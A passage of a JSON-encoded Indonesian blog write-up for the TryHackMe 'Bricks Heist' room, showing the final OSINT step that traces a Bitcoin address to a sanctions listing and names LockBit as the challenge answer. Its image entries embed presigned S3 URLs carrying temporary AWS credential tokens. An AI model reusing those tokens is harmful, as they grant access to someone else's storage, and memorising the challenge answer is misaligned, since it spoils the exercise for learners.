+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/7bb36e2e-eda5-441c-8449-21e068aef9be/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RIWTPT3J%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125336Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIQDAMGgaz3UknCAyfWu5DJudB2pf48SPEFi6tNtyh6yMJwIgVmqYVpweAc1YQs%2FcFsj1HaZkzS02xHgvOZqHbvUZYxkqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDI3lJKQH%2FZvLhfIruircA9n0N6ClO1qedStpJdD%2BjBdevPSX7eC4chMDAAGbSVPxi7F4aqzFvlSxnMJEDgPyl5NQ%2BZ0Q2YMLJaoGh%2Fezi9MMPsioUjB5kg3HFh1fw0GKDnXOhL4B5RWFqrtRLOIcxG46q6CdrcTsEZz%2BJmZtA6K90qzxxJYwD5FDao3RANefTtSp0CvwgBNn9Xc9ufLbY%2BBbPLyW8%2B4oqrYXDc%2BsfoMujwX54ZiBUahWt616GAHMBrrevLiD3EUMTCDcftNkzMU6Nvd6t3JUUVwPzvT9bBkkGDnP5lWhw766vUIfO2KWRW3W41EZl1f9oRkf41eXXGcTLsIjWT5%2FNXgVwcp3HZBrV83ZeLWx%2FtdK1Fz0PTZfi5glzRWeR7yGGZRwdpczdwebuDYb%2BSTZas8gElyHAarbynDD2B6MxqCi8jtfNCOZqyohGqI8gUYQJxFqCZ4%2BMftZp5CyLPdarj%2BC1vAOxzsKqWfEHz11hoI%2FfMqY%2BVS7cnoaZEU1ly6QqtWmTXZ5RBIslguw4e5J7uKceqZtuw1ITOVLDcfh0Ut0PYnCrmQ9X1poSBpMuaYHLZ3Efm0YLq1%2FClsr8o73beYyXHEI5tLKDJgYJjQgXWzkbqaWp1t%2B2f8YaiPOVeBkNEckMPvXr8YGOqUBk4mYfLUqbZOCUZmQ6Y9MYztjTOm1OcORX97E161r1tpV1GOY18xC7E0XBdYVx2mrMlL%2BLSPHJI%2BSvIMO0ii40j9QE4wFbA%2FtfPkcA8nK1xag3CHgjSgFlq2X2pjPYgcbEl2w6ZSHbfZhg98qKkJn4P9P0cwxJtvYzDj2ZK58TEER4V6rH2Iy5xkSBr18bhw0cT8qjYjA6yGP5wVP8txzqaF%2FGmji&X-Amz-Signature=5092ae653816d727141fa9464248d9827a83c12f8731ce29935dbc8ad3a84240&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8076-9ff4-cab088df6430",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:56:00.000Z",
+        "last_edited_time": "2025-08-10T09:56:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80f9-b321-d0c0a2609dde",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:56:00.000Z",
+        "last_edited_time": "2025-08-10T09:56:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Informasi tersebut saya menemukan layanan ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "blockchain explorer",
+              "annotations": {
+                "bold": false,
+                "italic": true,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " yang bisa memeriksa riwayat transaksi wallet Bitcoin.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80ab-b58c-c775482ddefd",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:56:00.000Z",
+        "last_edited_time": "2025-08-10T09:56:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.blockchain.com/explorer&ved=2ahUKEwijpIiZ9P-OAxVrzzgGHbd2E9oQFnoECBoQAQ&usg=AOvVaw2SQjeP0dqYW5lHAkaA9U3f",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": "https://www.google.com/url?sa=t&rct=j&opi=89978449&url=https%3A%2F%2Fwww.blockchain.com%2Fexplorer&ved=2ahUKEwijpIiZ9P-OAxVrzzgGHbd2E9oQFnoECBoQAQ&usg=AOvVaw2SQjeP0dqYW5lHAkaA9U3f"
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8098-99a1-e4b6bb20f2ca",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:56:00.000Z",
+        "last_edited_time": "2025-08-10T09:57:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Saat mengecek transaksi pertama wallet ini, saya menemukan alamat lain yang berinteraksi dengannya:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-802f-886d-db5d91cacb0e",
+        "type": "code",
+        "created_time": "2025-08-10T09:57:00.000Z",
+        "last_edited_time": "2025-08-10T09:57:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8077-90ed-c18205ec9aeb",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:57:00.000Z",
+        "last_edited_time": "2025-08-10T09:57:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Saya menelusuri alamat tersebut di Google dan menemukan entri di:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80c9-8831-de3d155b7e9b",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:57:00.000Z",
+        "last_edited_time": "2025-08-10T09:57:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "https://www.opensanctions.org/entities/ofac-4d99af7cc172df2b9fbb833cb5af39dbbc011a2c/",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": "https://www.opensanctions.org/entities/ofac-4d99af7cc172df2b9fbb833cb5af39dbbc011a2c/"
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8064-bac3-f9d09d939d42",
+        "type": "image",
+        "created_time": "2025-08-10T09:58:00.000Z",
+        "last_edited_time": "2025-08-10T09:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-24.png",
+          "expiry_time": "2025-09-18T13:53:36.088Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-24.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/94144e44-826a-4c08-9799-0cf059bd1002/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RIWTPT3J%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125336Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIQDAMGgaz3UknCAyfWu5DJudB2pf48SPEFi6tNtyh6yMJwIgVmqYVpweAc1YQs%2FcFsj1HaZkzS02xHgvOZqHbvUZYxkqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDI3lJKQH%2FZvLhfIruircA9n0N6ClO1qedStpJdD%2BjBdevPSX7eC4chMDAAGbSVPxi7F4aqzFvlSxnMJEDgPyl5NQ%2BZ0Q2YMLJaoGh%2Fezi9MMPsioUjB5kg3HFh1fw0GKDnXOhL4B5RWFqrtRLOIcxG46q6CdrcTsEZz%2BJmZtA6K90qzxxJYwD5FDao3RANefTtSp0CvwgBNn9Xc9ufLbY%2BBbPLyW8%2B4oqrYXDc%2BsfoMujwX54ZiBUahWt616GAHMBrrevLiD3EUMTCDcftNkzMU6Nvd6t3JUUVwPzvT9bBkkGDnP5lWhw766vUIfO2KWRW3W41EZl1f9oRkf41eXXGcTLsIjWT5%2FNXgVwcp3HZBrV83ZeLWx%2FtdK1Fz0PTZfi5glzRWeR7yGGZRwdpczdwebuDYb%2BSTZas8gElyHAarbynDD2B6MxqCi8jtfNCOZqyohGqI8gUYQJxFqCZ4%2BMftZp5CyLPdarj%2BC1vAOxzsKqWfEHz11hoI%2FfMqY%2BVS7cnoaZEU1ly6QqtWmTXZ5RBIslguw4e5J7uKceqZtuw1ITOVLDcfh0Ut0PYnCrmQ9X1poSBpMuaYHLZ3Efm0YLq1%2FClsr8o73beYyXHEI5tLKDJgYJjQgXWzkbqaWp1t%2B2f8YaiPOVeBkNEckMPvXr8YGOqUBk4mYfLUqbZOCUZmQ6Y9MYztjTOm1OcORX97E161r1tpV1GOY18xC7E0XBdYVx2mrMlL%2BLSPHJI%2BSvIMO0ii40j9QE4wFbA%2FtfPkcA8nK1xag3CHgjSgFlq2X2pjPYgcbEl2w6ZSHbfZhg98qKkJn4P9P0cwxJtvYzDj2ZK58TEER4V6rH2Iy5xkSBr18bhw0cT8qjYjA6yGP5wVP8txzqaF%2FGmji&X-Amz-Signature=085958ae861f757495762c2a7da15c52768b33fe884ca585bb9516bc7419e7f3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80c8-ad34-f4fbebd24e2a",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:57:00.000Z",
+        "last_edited_time": "2025-08-10T09:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Terlihat pada wallet holder, situs ini menyebutkan wallet tersebut dimiliki oleh ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "Ivan Gennadievich Kondratiev",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ".",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80b4-8bca-e524e81b1ac1",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:59:00.000Z",
+        "last_edited_time": "2025-08-10T09:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Tanpa lama, saya langsung saja ketikan namanya di google search.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-805a-9489-c760e18265bd",
+        "type": "image",
+        "created_time": "2025-08-10T09:59:00.000Z",
+        "last_edited_time": "2025-08-10T09:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-25.png",
+          "expiry_time": "2025-09-18T13:53:36.110Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-25.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/14ad5a8e-eb57-4331-9296-906eb624da35/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RIWTPT3J%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125336Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIQDAMGgaz3UknCAyfWu5DJudB2pf48SPEFi6tNtyh6yMJwIgVmqYVpweAc1YQs%2FcFsj1HaZkzS02xHgvOZqHbvUZYxkqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDI3lJKQH%2FZvLhfIruircA9n0N6ClO1qedStpJdD%2BjBdevPSX7eC4chMDAAGbSVPxi7F4aqzFvlSxnMJEDgPyl5NQ%2BZ0Q2YMLJaoGh%2Fezi9MMPsioUjB5kg3HFh1fw0GKDnXOhL4B5RWFqrtRLOIcxG46q6CdrcTsEZz%2BJmZtA6K90qzxxJYwD5FDao3RANefTtSp0CvwgBNn9Xc9ufLbY%2BBbPLyW8%2B4oqrYXDc%2BsfoMujwX54ZiBUahWt616GAHMBrrevLiD3EUMTCDcftNkzMU6Nvd6t3JUUVwPzvT9bBkkGDnP5lWhw766vUIfO2KWRW3W41EZl1f9oRkf41eXXGcTLsIjWT5%2FNXgVwcp3HZBrV83ZeLWx%2FtdK1Fz0PTZfi5glzRWeR7yGGZRwdpczdwebuDYb%2BSTZas8gElyHAarbynDD2B6MxqCi8jtfNCOZqyohGqI8gUYQJxFqCZ4%2BMftZp5CyLPdarj%2BC1vAOxzsKqWfEHz11hoI%2FfMqY%2BVS7cnoaZEU1ly6QqtWmTXZ5RBIslguw4e5J7uKceqZtuw1ITOVLDcfh0Ut0PYnCrmQ9X1poSBpMuaYHLZ3Efm0YLq1%2FClsr8o73beYyXHEI5tLKDJgYJjQgXWzkbqaWp1t%2B2f8YaiPOVeBkNEckMPvXr8YGOqUBk4mYfLUqbZOCUZmQ6Y9MYztjTOm1OcORX97E161r1tpV1GOY18xC7E0XBdYVx2mrMlL%2BLSPHJI%2BSvIMO0ii40j9QE4wFbA%2FtfPkcA8nK1xag3CHgjSgFlq2X2pjPYgcbEl2w6ZSHbfZhg98qKkJn4P9P0cwxJtvYzDj2ZK58TEER4V6rH2Iy5xkSBr18bhw0cT8qjYjA6yGP5wVP8txzqaF%2FGmji&X-Amz-Signature=0d67f4abe30974559157be2332c4f0ef81be288571c816eb99f9fd1db400b81b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-808d-a69f-d2794646ddb2",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:58:00.000Z",
+        "last_edited_time": "2025-08-10T09:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Setelah mencari nama tersebut di Google, saya menemukan beberapa berita internasional, salah satunya berjudul:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8086-ac1a-ee9e5e660c7a",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:58:00.000Z",
+        "last_edited_time": "2025-08-10T09:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "\"US indicts two Russian nationals in LockBit ransomware ...\"",
+              "annotations": {
+                "bold": false,
+                "italic": true,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80a0-ba85-e9f75bc220d2",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:58:00.000Z",
+        "last_edited_time": "2025-08-10T09:58:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Dari sini jelas bahwa wallet tersebut terhubung dengan kelompok ransomware ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "LockBit",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80ea-88aa-e1c5ae7a7268",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:59:00.000Z",
+        "last_edited_time": "2025-08-10T09:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Jadi jawaban nya adalah ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "LockBit",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-80af-89ba-e41732c97073",
+        "type": "paragraph",
+        "created_time": "2025-08-10T09:55:00.000Z",
+        "last_edited_time": "2025-08-10T09:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "24bdb469-a81d-8050-baaf-eaba6bb5fd18",
+        "type": "image",
+        "created_time": "2025-08-10T09:20:00.000Z",
+        "last_edited_time": "2025-08-10T09:20:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-26.png",
+          "expiry_time": "2025-09-18T13:53:36.153Z",
+          "localUrl": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/image-26.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/4f7b6fec-4371-4953-a571-2a5af9c11aa6/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466RIWTPT3J%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T125336Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIQDAMGgaz3UknCAyfWu5DJudB2pf48SPEFi6tNtyh6yMJwIgVmqYVpweAc1YQs%2FcFsj1HaZkzS02xHgvOZqHbvUZYxkqiAQIvf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDI3lJKQH%2FZvLhfIruircA9n0N6ClO1qedStpJdD%2BjBdevPSX7eC4chMDAAGbSVPxi7F4aqzFvlSxnMJEDgPyl5NQ%2BZ0Q2YMLJaoGh%2Fezi9MMPsioUjB5kg3HFh1fw0GKDnXOhL4B5RWFqrtRLOIcxG46q6CdrcTsEZz%2BJmZtA6K90qzxxJYwD5FDao3RANefTtSp0CvwgBNn9Xc9ufLbY%2BBbPLyW8%2B4oqrYXDc%2BsfoMujwX54ZiBUahWt616GAHMBrrevLiD3EUMTCDcftNkzMU6Nvd6t3JUUVwPzvT9bBkkGDnP5lWhw766vUIfO2KWRW3W41EZl1f9oRkf41eXXGcTLsIjWT5%2FNXgVwcp3HZBrV83ZeLWx%2FtdK1Fz0PTZfi5glzRWeR7yGGZRwdpczdwebuDYb%2BSTZas8gElyHAarbynDD2B6MxqCi8jtfNCOZqyohGqI8gUYQJxFqCZ4%2BMftZp5CyLPdarj%2BC1vAOxzsKqWfEHz11hoI%2FfMqY%2BVS7cnoaZEU1ly6QqtWmTXZ5RBIslguw4e5J7uKceqZtuw1ITOVLDcfh0Ut0PYnCrmQ9X1poSBpMuaYHLZ3Efm0YLq1%2FClsr8o73beYyXHEI5tLKDJgYJjQgXWzkbqaWp1t%2B2f8YaiPOVeBkNEckMPvXr8YGOqUBk4mYfLUqbZOCUZmQ6Y9MYztjTOm1OcORX97E161r1tpV1GOY18xC7E0XBdYVx2mrMlL%2BLSPHJI%2BSvIMO0ii40j9QE4wFbA%2FtfPkcA8nK1xag3CHgjSgFlq2X2pjPYgcbEl2w6ZSHbfZhg98qKkJn4P9P0cwxJtvYzDj2ZK58TEER4V6rH2Iy5xkSBr18bhw0cT8qjYjA6yGP5wVP8txzqaF%2FGmji&X-Amz-Signature=58e658f31b1fcc5fed7ab6ef48936157253538b0c500dab7a7b4148cf5ab6f60&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      }
+    ],
+    "featured_image": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/featured-image.png",
+    "og_image": "/posts/tryhack3m-bricks-heist-24adb469a81d807eb9ddc92c2292fde2/featured-image.png"
+  }
+}
